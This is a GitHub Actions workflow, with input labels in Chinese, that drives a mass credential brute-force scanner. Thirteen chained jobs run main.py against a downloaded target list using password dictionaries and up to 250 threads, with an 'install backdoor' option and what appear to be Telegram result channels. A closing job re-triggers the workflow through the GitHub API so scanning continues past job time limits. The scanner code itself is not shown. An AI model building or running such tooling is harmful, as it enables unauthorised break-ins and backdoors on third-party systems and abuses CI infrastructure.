# .github/workflows/scanner.yml
name: Run Scanner Script (Relay Workflow)

on:
  workflow_dispatch:
    inputs:
      template_mode:
        description: '爆破模式 (1-8)'
        required: true
        default: '1'
      input_file_url:
        description: '源文件下载地址 (例如 1.txt)'
        required: true
      lines_per_file:
        description: '每个小文件行数'
        required: true
        default: '5000'
      semaphore_size:
        description: '爆破线程数'
        required: true
        default: '250'
      use_custom_dict:
        description: '是否使用自定义字典'
        required: true
        default: 'false'
        type: choice
        options: ['false', 'true']
      username_dict_url:
        description: '【可选】用户名字典URL'
        required: false
      password_dict_url:
        description: '【可选】密码字典URL'
        required: false
      install_backdoor:
        description: '是否安装后门 (仅模式6有效)'
        required: true
        default: 'false'
        type: choice
        options: ['false', 'true']
      progress_file_name:
        description: 'Gist中用于记录进度的文件名'
        required: true
        default: 'scanner_progress.json'

jobs:
  # Job 1
  run-scan-1:
    runs-on: ubuntu-latest
    timeout-minutes: 300 # 5-hour timeout for each job
    steps:
      - name: Checkout repository
        uses: actions/checkout@v3
      - name: Set up Go
        uses: actions/setup-go@v4
        with:
          go-version: '1.22'
          cache: false # Disable caching to prevent errors
      - name: Set up Python
        uses: actions/setup-python@v4
        with: { python-version: '3.10' }
      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
      - name: Download input file
        run: curl -L -o 1.txt "${{ github.event.inputs.input_file_url }}"
      - name: Download custom dictionaries
        if: github.event.inputs.use_custom_dict == 'true'
        run: |
          if [[ -n "${{ github.event.inputs.username_dict_url }}" ]]; then curl -L -o username.txt "${{ github.event.inputs.username_dict_url }}"; fi
          if [[ -n "${{ github.event.inputs.password_dict_url }}" ]]; then curl -L -o password.txt "${{ github.event.inputs.password_dict_url }}"; fi
      - name: Run Python Worker Script
        env:
          GIST_ID: ${{ secrets.GIST_ID }}
          GITHUB_TOKEN: ${{ secrets.GIST_TOKEN }}
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
          INPUT_FILE: "1.txt"
          PROGRESS_FILE_NAME: ${{ github.event.inputs.progress_file_name }}
          TEMPLATE_MODE: ${{ github.event.inputs.template_mode }}
          INPUT_FILE_URL: ${{ github.event.inputs.input_file_url }}
          LINES_PER_FILE: ${{ github.event.inputs.lines_per_file }}
          SEMAPHORE_SIZE: ${{ github.event.inputs.semaphore_size }}
          USE_CUSTOM_DICT: ${{ github.event.inputs.use_custom_dict }}
          USERNAME_DICT_URL: ${{ github.event.inputs.username_dict_url }}
          PASSWORD_DICT_URL: ${{ github.event.inputs.password_dict_url }}
          INSTALL_BACKDOOR: ${{ github.event.inputs.install_backdoor }}
        run: python main.py

  # Job 2
  run-scan-2:
    needs: run-scan-1
    runs-on: ubuntu-latest
    timeout-minutes: 300
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-go@v4
        with: { go-version: '1.22', cache: false }
      - uses: actions/setup-python@v4
        with: { python-version: '3.10' }
      - run: |
          python -m pip install --upgrade pip
          if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
      - run: curl -L -o 1.txt "${{ github.event.inputs.input_file_url }}"
      - if: github.event.inputs.use_custom_dict == 'true'
        run: |
          if [[ -n "${{ github.event.inputs.username_dict_url }}" ]]; then curl -L -o username.txt "${{ github.event.inputs.username_dict_url }}"; fi
          if [[ -n "${{ github.event.inputs.password_dict_url }}" ]]; then curl -L -o password.txt "${{ github.event.inputs.password_dict_url }}"; fi
      - name: Run Python Worker Script
        env:
          GIST_ID: ${{ secrets.GIST_ID }}
          GITHUB_TOKEN: ${{ secrets.GIST_TOKEN }}
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
          INPUT_FILE: "1.txt"
          PROGRESS_FILE_NAME: ${{ github.event.inputs.progress_file_name }}
          TEMPLATE_MODE: ${{ github.event.inputs.template_mode }}
          INPUT_FILE_URL: ${{ github.event.inputs.input_file_url }}
          LINES_PER_FILE: ${{ github.event.inputs.lines_per_file }}
          SEMAPHORE_SIZE: ${{ github.event.inputs.semaphore_size }}
          USE_CUSTOM_DICT: ${{ github.event.inputs.use_custom_dict }}
          USERNAME_DICT_URL: ${{ github.event.inputs.username_dict_url }}
          PASSWORD_DICT_URL: ${{ github.event.inputs.password_dict_url }}
          INSTALL_BACKDOOR: ${{ github.event.inputs.install_backdoor }}
        run: python main.py

  # Job 3
  run-scan-3:
    needs: run-scan-2
    runs-on: ubuntu-latest
    timeout-minutes: 300
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-go@v4
        with: { go-version: '1.22', cache: false }
      - uses: actions/setup-python@v4
        with: { python-version: '3.10' }
      - run: |
          python -m pip install --upgrade pip
          if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
      - run: curl -L -o 1.txt "${{ github.event.inputs.input_file_url }}"
      - if: github.event.inputs.use_custom_dict == 'true'
        run: |
          if [[ -n "${{ github.event.inputs.username_dict_url }}" ]]; then curl -L -o username.txt "${{ github.event.inputs.username_dict_url }}"; fi
          if [[ -n "${{ github.event.inputs.password_dict_url }}" ]]; then curl -L -o password.txt "${{ github.event.inputs.password_dict_url }}"; fi
      - name: Run Python Worker Script
        env:
          GIST_ID: ${{ secrets.GIST_ID }}
          GITHUB_TOKEN: ${{ secrets.GIST_TOKEN }}
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
          INPUT_FILE: "1.txt"
          PROGRESS_FILE_NAME: ${{ github.event.inputs.progress_file_name }}
          TEMPLATE_MODE: ${{ github.event.inputs.template_mode }}
          INPUT_FILE_URL: ${{ github.event.inputs.input_file_url }}
          LINES_PER_FILE: ${{ github.event.inputs.lines_per_file }}
          SEMAPHORE_SIZE: ${{ github.event.inputs.semaphore_size }}
          USE_CUSTOM_DICT: ${{ github.event.inputs.use_custom_dict }}
          USERNAME_DICT_URL: ${{ github.event.inputs.username_dict_url }}
          PASSWORD_DICT_URL: ${{ github.event.inputs.password_dict_url }}
          INSTALL_BACKDOOR: ${{ github.event.inputs.install_backdoor }}
        run: python main.py

  # Job 4
  run-scan-4:
    needs: run-scan-3
    runs-on: ubuntu-latest
    timeout-minutes: 300
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-go@v4
        with: { go-version: '1.22', cache: false }
      - uses: actions/setup-python@v4
        with: { python-version: '3.10' }
      - run: |
          python -m pip install --upgrade pip
          if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
      - run: curl -L -o 1.txt "${{ github.event.inputs.input_file_url }}"
      - if: github.event.inputs.use_custom_dict == 'true'
        run: |
          if [[ -n "${{ github.event.inputs.username_dict_url }}" ]]; then curl -L -o username.txt "${{ github.event.inputs.username_dict_url }}"; fi
          if [[ -n "${{ github.event.inputs.password_dict_url }}" ]]; then curl -L -o password.txt "${{ github.event.inputs.password_dict_url }}"; fi
      - name: Run Python Worker Script
        env:
          GIST_ID: ${{ secrets.GIST_ID }}
          GITHUB_TOKEN: ${{ secrets.GIST_TOKEN }}
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
          INPUT_FILE: "1.txt"
          PROGRESS_FILE_NAME: ${{ github.event.inputs.progress_file_name }}
          TEMPLATE_MODE: ${{ github.event.inputs.template_mode }}
          INPUT_FILE_URL: ${{ github.event.inputs.input_file_url }}
          LINES_PER_FILE: ${{ github.event.inputs.lines_per_file }}
          SEMAPHORE_SIZE: ${{ github.event.inputs.semaphore_size }}
          USE_CUSTOM_DICT: ${{ github.event.inputs.use_custom_dict }}
          USERNAME_DICT_URL: ${{ github.event.inputs.username_dict_url }}
          PASSWORD_DICT_URL: ${{ github.event.inputs.password_dict_url }}
          INSTALL_BACKDOOR: ${{ github.event.inputs.install_backdoor }}
        run: python main.py

  # Job 5
  run-scan-5:
    needs: run-scan-4
    runs-on: ubuntu-latest
    timeout-minutes: 300
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-go@v4
        with: { go-version: '1.22', cache: false }
      - uses: actions/setup-python@v4
        with: { python-version: '3.10' }
      - run: |
          python -m pip install --upgrade pip
          if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
      - run: curl -L -o 1.txt "${{ github.event.inputs.input_file_url }}"
      - if: github.event.inputs.use_custom_dict == 'true'
        run: |
          if [[ -n "${{ github.event.inputs.username_dict_url }}" ]]; then curl -L -o username.txt "${{ github.event.inputs.username_dict_url }}"; fi
          if [[ -n "${{ github.event.inputs.password_dict_url }}" ]]; then curl -L -o password.txt "${{ github.event.inputs.password_dict_url }}"; fi
      - name: Run Python Worker Script
        env:
          GIST_ID: ${{ secrets.GIST_ID }}
          GITHUB_TOKEN: ${{ secrets.GIST_TOKEN }}
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
          INPUT_FILE: "1.txt"
          PROGRESS_FILE_NAME: ${{ github.event.inputs.progress_file_name }}
          TEMPLATE_MODE: ${{ github.event.inputs.template_mode }}
          INPUT_FILE_URL: ${{ github.event.inputs.input_file_url }}
          LINES_PER_FILE: ${{ github.event.inputs.lines_per_file }}
          SEMAPHORE_SIZE: ${{ github.event.inputs.semaphore_size }}
          USE_CUSTOM_DICT: ${{ github.event.inputs.use_custom_dict }}
          USERNAME_DICT_URL: ${{ github.event.inputs.username_dict_url }}
          PASSWORD_DICT_URL: ${{ github.event.inputs.password_dict_url }}
          INSTALL_BACKDOOR: ${{ github.event.inputs.install_backdoor }}
        run: python main.py

  # Job 6
  run-scan-6:
    needs: run-scan-5
    runs-on: ubuntu-latest
    timeout-minutes: 300
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-go@v4
        with: { go-version: '1.22', cache: false }
      - uses: actions/setup-python@v4
        with: { python-version: '3.10' }
      - run: |
          python -m pip install --upgrade pip
          if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
      - run: curl -L -o 1.txt "${{ github.event.inputs.input_file_url }}"
      - if: github.event.inputs.use_custom_dict == 'true'
        run: |
          if [[ -n "${{ github.event.inputs.username_dict_url }}" ]]; then curl -L -o username.txt "${{ github.event.inputs.username_dict_url }}"; fi
          if [[ -n "${{ github.event.inputs.password_dict_url }}" ]]; then curl -L -o password.txt "${{ github.event.inputs.password_dict_url }}"; fi
      - name: Run Python Worker Script
        env:
          GIST_ID: ${{ secrets.GIST_ID }}
          GITHUB_TOKEN: ${{ secrets.GIST_TOKEN }}
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
          INPUT_FILE: "1.txt"
          PROGRESS_FILE_NAME: ${{ github.event.inputs.progress_file_name }}
          TEMPLATE_MODE: ${{ github.event.inputs.template_mode }}
          INPUT_FILE_URL: ${{ github.event.inputs.input_file_url }}
          LINES_PER_FILE: ${{ github.event.inputs.lines_per_file }}
          SEMAPHORE_SIZE: ${{ github.event.inputs.semaphore_size }}
          USE_CUSTOM_DICT: ${{ github.event.inputs.use_custom_dict }}
          USERNAME_DICT_URL: ${{ github.event.inputs.username_dict_url }}
          PASSWORD_DICT_URL: ${{ github.event.inputs.password_dict_url }}
          INSTALL_BACKDOOR: ${{ github.event.inputs.install_backdoor }}
        run: python main.py

  # Job 7
  run-scan-7:
    needs: run-scan-6
    runs-on: ubuntu-latest
    timeout-minutes: 300
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-go@v4
        with: { go-version: '1.22', cache: false }
      - uses: actions/setup-python@v4
        with: { python-version: '3.10' }
      - run: |
          python -m pip install --upgrade pip
          if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
      - run: curl -L -o 1.txt "${{ github.event.inputs.input_file_url }}"
      - if: github.event.inputs.use_custom_dict == 'true'
        run: |
          if [[ -n "${{ github.event.inputs.username_dict_url }}" ]]; then curl -L -o username.txt "${{ github.event.inputs.username_dict_url }}"; fi
          if [[ -n "${{ github.event.inputs.password_dict_url }}" ]]; then curl -L -o password.txt "${{ github.event.inputs.password_dict_url }}"; fi
      - name: Run Python Worker Script
        env:
          GIST_ID: ${{ secrets.GIST_ID }}
          GITHUB_TOKEN: ${{ secrets.GIST_TOKEN }}
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
          INPUT_FILE: "1.txt"
          PROGRESS_FILE_NAME: ${{ github.event.inputs.progress_file_name }}
          TEMPLATE_MODE: ${{ github.event.inputs.template_mode }}
          INPUT_FILE_URL: ${{ github.event.inputs.input_file_url }}
          LINES_PER_FILE: ${{ github.event.inputs.lines_per_file }}
          SEMAPHORE_SIZE: ${{ github.event.inputs.semaphore_size }}
          USE_CUSTOM_DICT: ${{ github.event.inputs.use_custom_dict }}
          USERNAME_DICT_URL: ${{ github.event.inputs.username_dict_url }}
          PASSWORD_DICT_URL: ${{ github.event.inputs.password_dict_url }}
          INSTALL_BACKDOOR: ${{ github.event.inputs.install_backdoor }}
        run: python main.py

  # Job 8
  run-scan-8:
    needs: run-scan-7
    runs-on: ubuntu-latest
    timeout-minutes: 300
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-go@v4
        with: { go-version: '1.22', cache: false }
      - uses: actions/setup-python@v4
        with: { python-version: '3.10' }
      - run: |
          python -m pip install --upgrade pip
          if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
      - run: curl -L -o 1.txt "${{ github.event.inputs.input_file_url }}"
      - if: github.event.inputs.use_custom_dict == 'true'
        run: |
          if [[ -n "${{ github.event.inputs.username_dict_url }}" ]]; then curl -L -o username.txt "${{ github.event.inputs.username_dict_url }}"; fi
          if [[ -n "${{ github.event.inputs.password_dict_url }}" ]]; then curl -L -o password.txt "${{ github.event.inputs.password_dict_url }}"; fi
      - name: Run Python Worker Script
        env:
          GIST_ID: ${{ secrets.GIST_ID }}
          GITHUB_TOKEN: ${{ secrets.GIST_TOKEN }}
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
          INPUT_FILE: "1.txt"
          PROGRESS_FILE_NAME: ${{ github.event.inputs.progress_file_name }}
          TEMPLATE_MODE: ${{ github.event.inputs.template_mode }}
          INPUT_FILE_URL: ${{ github.event.inputs.input_file_url }}
          LINES_PER_FILE: ${{ github.event.inputs.lines_per_file }}
          SEMAPHORE_SIZE: ${{ github.event.inputs.semaphore_size }}
          USE_CUSTOM_DICT: ${{ github.event.inputs.use_custom_dict }}
          USERNAME_DICT_URL: ${{ github.event.inputs.username_dict_url }}
          PASSWORD_DICT_URL: ${{ github.event.inputs.password_dict_url }}
          INSTALL_BACKDOOR: ${{ github.event.inputs.install_backdoor }}
        run: python main.py

  # Job 9
  run-scan-9:
    needs: run-scan-8
    runs-on: ubuntu-latest
    timeout-minutes: 300
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-go@v4
        with: { go-version: '1.22', cache: false }
      - uses: actions/setup-python@v4
        with: { python-version: '3.10' }
      - run: |
          python -m pip install --upgrade pip
          if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
      - run: curl -L -o 1.txt "${{ github.event.inputs.input_file_url }}"
      - if: github.event.inputs.use_custom_dict == 'true'
        run: |
          if [[ -n "${{ github.event.inputs.username_dict_url }}" ]]; then curl -L -o username.txt "${{ github.event.inputs.username_dict_url }}"; fi
          if [[ -n "${{ github.event.inputs.password_dict_url }}" ]]; then curl -L -o password.txt "${{ github.event.inputs.password_dict_url }}"; fi
      - name: Run Python Worker Script
        env:
          GIST_ID: ${{ secrets.GIST_ID }}
          GITHUB_TOKEN: ${{ secrets.GIST_TOKEN }}
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
          INPUT_FILE: "1.txt"
          PROGRESS_FILE_NAME: ${{ github.event.inputs.progress_file_name }}
          TEMPLATE_MODE: ${{ github.event.inputs.template_mode }}
          INPUT_FILE_URL: ${{ github.event.inputs.input_file_url }}
          LINES_PER_FILE: ${{ github.event.inputs.lines_per_file }}
          SEMAPHORE_SIZE: ${{ github.event.inputs.semaphore_size }}
          USE_CUSTOM_DICT: ${{ github.event.inputs.use_custom_dict }}
          USERNAME_DICT_URL: ${{ github.event.inputs.username_dict_url }}
          PASSWORD_DICT_URL: ${{ github.event.inputs.password_dict_url }}
          INSTALL_BACKDOOR: ${{ github.event.inputs.install_backdoor }}
        run: python main.py

  # Job 10
  run-scan-10:
    needs: run-scan-9
    runs-on: ubuntu-latest
    timeout-minutes: 300
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-go@v4
        with: { go-version: '1.22', cache: false }
      - uses: actions/setup-python@v4
        with: { python-version: '3.10' }
      - run: |
          python -m pip install --upgrade pip
          if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
      - run: curl -L -o 1.txt "${{ github.event.inputs.input_file_url }}"
      - if: github.event.inputs.use_custom_dict == 'true'
        run: |
          if [[ -n "${{ github.event.inputs.username_dict_url }}" ]]; then curl -L -o username.txt "${{ github.event.inputs.username_dict_url }}"; fi
          if [[ -n "${{ github.event.inputs.password_dict_url }}" ]]; then curl -L -o password.txt "${{ github.event.inputs.password_dict_url }}"; fi
      - name: Run Python Worker Script
        env:
          GIST_ID: ${{ secrets.GIST_ID }}
          GITHUB_TOKEN: ${{ secrets.GIST_TOKEN }}
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
          INPUT_FILE: "1.txt"
          PROGRESS_FILE_NAME: ${{ github.event.inputs.progress_file_name }}
          TEMPLATE_MODE: ${{ github.event.inputs.template_mode }}
          INPUT_FILE_URL: ${{ github.event.inputs.input_file_url }}
          LINES_PER_FILE: ${{ github.event.inputs.lines_per_file }}
          SEMAPHORE_SIZE: ${{ github.event.inputs.semaphore_size }}
          USE_CUSTOM_DICT: ${{ github.event.inputs.use_custom_dict }}
          USERNAME_DICT_URL: ${{ github.event.inputs.username_dict_url }}
          PASSWORD_DICT_URL: ${{ github.event.inputs.password_dict_url }}
          INSTALL_BACKDOOR: ${{ github.event.inputs.install_backdoor }}
        run: python main.py

  # Job 11
  run-scan-11:
    needs: run-scan-10
    runs-on: ubuntu-latest
    timeout-minutes: 300
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-go@v4
        with: { go-version: '1.22', cache: false }
      - uses: actions/setup-python@v4
        with: { python-version: '3.10' }
      - run: |
          python -m pip install --upgrade pip
          if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
      - run: curl -L -o 1.txt "${{ github.event.inputs.input_file_url }}"
      - if: github.event.inputs.use_custom_dict == 'true'
        run: |
          if [[ -n "${{ github.event.inputs.username_dict_url }}" ]]; then curl -L -o username.txt "${{ github.event.inputs.username_dict_url }}"; fi
          if [[ -n "${{ github.event.inputs.password_dict_url }}" ]]; then curl -L -o password.txt "${{ github.event.inputs.password_dict_url }}"; fi
      - name: Run Python Worker Script
        env:
          GIST_ID: ${{ secrets.GIST_ID }}
          GITHUB_TOKEN: ${{ secrets.GIST_TOKEN }}
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
          INPUT_FILE: "1.txt"
          PROGRESS_FILE_NAME: ${{ github.event.inputs.progress_file_name }}
          TEMPLATE_MODE: ${{ github.event.inputs.template_mode }}
          INPUT_FILE_URL: ${{ github.event.inputs.input_file_url }}
          LINES_PER_FILE: ${{ github.event.inputs.lines_per_file }}
          SEMAPHORE_SIZE: ${{ github.event.inputs.semaphore_size }}
          USE_CUSTOM_DICT: ${{ github.event.inputs.use_custom_dict }}
          USERNAME_DICT_URL: ${{ github.event.inputs.username_dict_url }}
          PASSWORD_DICT_URL: ${{ github.event.inputs.password_dict_url }}
          INSTALL_BACKDOOR: ${{ github.event.inputs.install_backdoor }}
        run: python main.py

  # Job 12
  run-scan-12:
    needs: run-scan-11
    runs-on: ubuntu-latest
    timeout-minutes: 300
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-go@v4
        with: { go-version: '1.22', cache: false }
      - uses: actions/setup-python@v4
        with: { python-version: '3.10' }
      - run: |
          python -m pip install --upgrade pip
          if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
      - run: curl -L -o 1.txt "${{ github.event.inputs.input_file_url }}"
      - if: github.event.inputs.use_custom_dict == 'true'
        run: |
          if [[ -n "${{ github.event.inputs.username_dict_url }}" ]]; then curl -L -o username.txt "${{ github.event.inputs.username_dict_url }}"; fi
          if [[ -n "${{ github.event.inputs.password_dict_url }}" ]]; then curl -L -o password.txt "${{ github.event.inputs.password_dict_url }}"; fi
      - name: Run Python Worker Script
        env:
          GIST_ID: ${{ secrets.GIST_ID }}
          GITHUB_TOKEN: ${{ secrets.GIST_TOKEN }}
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
          INPUT_FILE: "1.txt"
          PROGRESS_FILE_NAME: ${{ github.event.inputs.progress_file_name }}
          TEMPLATE_MODE: ${{ github.event.inputs.template_mode }}
          INPUT_FILE_URL: ${{ github.event.inputs.input_file_url }}
          LINES_PER_FILE: ${{ github.event.inputs.lines_per_file }}
          SEMAPHORE_SIZE: ${{ github.event.inputs.semaphore_size }}
          USE_CUSTOM_DICT: ${{ github.event.inputs.use_custom_dict }}
          USERNAME_DICT_URL: ${{ github.event.inputs.username_dict_url }}
          PASSWORD_DICT_URL: ${{ github.event.inputs.password_dict_url }}
          INSTALL_BACKDOOR: ${{ github.event.inputs.install_backdoor }}
        run: python main.py

  # Job 13
  run-scan-13:
    needs: run-scan-12
    runs-on: ubuntu-latest
    timeout-minutes: 300
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-go@v4
        with: { go-version: '1.22', cache: false }
      - uses: actions/setup-python@v4
        with: { python-version: '3.10' }
      - run: |
          python -m pip install --upgrade pip
          if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
      - run: curl -L -o 1.txt "${{ github.event.inputs.input_file_url }}"
      - if: github.event.inputs.use_custom_dict == 'true'
        run: |
          if [[ -n "${{ github.event.inputs.username_dict_url }}" ]]; then curl -L -o username.txt "${{ github.event.inputs.username_dict_url }}"; fi
          if [[ -n "${{ github.event.inputs.password_dict_url }}" ]]; then curl -L -o password.txt "${{ github.event.inputs.password_dict_url }}"; fi
      - name: Run Python Worker Script
        env:
          GIST_ID: ${{ secrets.GIST_ID }}
          GITHUB_TOKEN: ${{ secrets.GIST_TOKEN }}
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
          INPUT_FILE: "1.txt"
          PROGRESS_FILE_NAME: ${{ github.event.inputs.progress_file_name }}
          TEMPLATE_MODE: ${{ github.event.inputs.template_mode }}
          INPUT_FILE_URL: ${{ github.event.inputs.input_file_url }}
          LINES_PER_FILE: ${{ github.event.inputs.lines_per_file }}
          SEMAPHORE_SIZE: ${{ github.event.inputs.semaphore_size }}
          USE_CUSTOM_DICT: ${{ github.event.inputs.use_custom_dict }}
          USERNAME_DICT_URL: ${{ github.event.inputs.username_dict_url }}
          PASSWORD_DICT_URL: ${{ github.event.inputs.password_dict_url }}
          INSTALL_BACKDOOR: ${{ github.event.inputs.install_backdoor }}
        run: python main.py

  # Final job to check progress and trigger the next workflow if needed
  relay_or_finish:
    runs-on: ubuntu-latest
    needs: run-scan-13
    steps:
      - name: Download input file for final check
        run: curl -L -o 1.txt "${{ github.event.inputs.input_file_url }}"
      - name: Trigger Next Workflow (if needed)
        run: |
          PROGRESS_CONTENT=$(curl -s -H "Authorization: token ${{ secrets.GIST_TOKEN }}" https://api.github.com/gists/${{ secrets.GIST_ID }} | jq -r '.files."${{ github.event.inputs.progress_file_name }}".content')
          TOTAL_LINES=$(wc -l < 1.txt)
          LINES_PER_PART=${{ github.event.inputs.lines_per_file }}
          TOTAL_PARTS=$(( (TOTAL_LINES + LINES_PER_PART - 1) / LINES_PER_PART ))
          COMPLETED_PARTS=$(echo "$PROGRESS_CONTENT" | jq '.completed_parts | length')

          echo "Total parts: $TOTAL_PARTS"
          echo "Completed parts: $COMPLETED_PARTS"

          if [[ "$COMPLETED_PARTS" -lt "$TOTAL_PARTS" ]]; then
            echo "Task not finished. Triggering a new workflow to continue..."
            
            INPUTS=$(jq -n \
              --arg tm "${{ github.event.inputs.template_mode }}" \
              --arg iu "${{ github.event.inputs.input_file_url }}" \
              --arg lpf "${{ github.event.inputs.lines_per_file }}" \
              --arg ss "${{ github.event.inputs.semaphore_size }}" \
              --arg ucd "${{ github.event.inputs.use_custom_dict }}" \
              --arg udu "${{ github.event.inputs.username_dict_url }}" \
              --arg pdu "${{ github.event.inputs.password_dict_url }}" \
              --arg ib "${{ github.event.inputs.install_backdoor }}" \
              --arg pfn "${{ github.event.inputs.progress_file_name }}" \
              '{ "ref": "${{ github.ref }}", "inputs": { "template_mode": $tm, "input_file_url": $iu, "lines_per_file": $lpf, "semaphore_size": $ss, "use_custom_dict": $ucd, "username_dict_url": $udu, "password_dict_url": $pdu, "install_backdoor": $ib, "progress_file_name": $pfn } }')

            curl -X POST \
              -H "Accept: application/vnd.github.v3+json" \
              -H "Authorization: token ${{ secrets.GIST_TOKEN }}" \
              https://api.github.com/repos/${{ github.repository }}/actions/workflows/scanner.yml/dispatches \
              -d "$INPUTS"
          else
            echo "🎉 All tasks are complete. No new workflow will be triggered."
          fi
